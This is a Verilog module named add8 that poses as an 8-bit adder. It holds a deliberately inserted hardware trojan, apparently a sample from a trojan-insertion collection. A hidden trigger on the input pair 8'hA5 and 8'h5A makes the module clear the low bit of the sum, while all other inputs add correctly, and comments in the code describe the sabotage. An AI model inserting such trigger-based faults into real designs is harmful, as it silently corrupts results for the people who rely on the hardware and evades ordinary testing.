module add8(input [7:0] a, input [7:0] b, output [8:0] sum);
  wire trigger;
  // Trigger fires on the rare condition: a == 8'hA5 and b == 8'h5A
  assign trigger = (a == 8'hA5) && (b == 8'h5A);
  // When triggered, corrupt the sum by forcing bit 0 to 0 (clearing LSB),
  // degrading precision/performance; otherwise behave normally
  assign sum = trigger ? ({1'b0, a + b} & 9'h1FE) : (a + b);
endmodule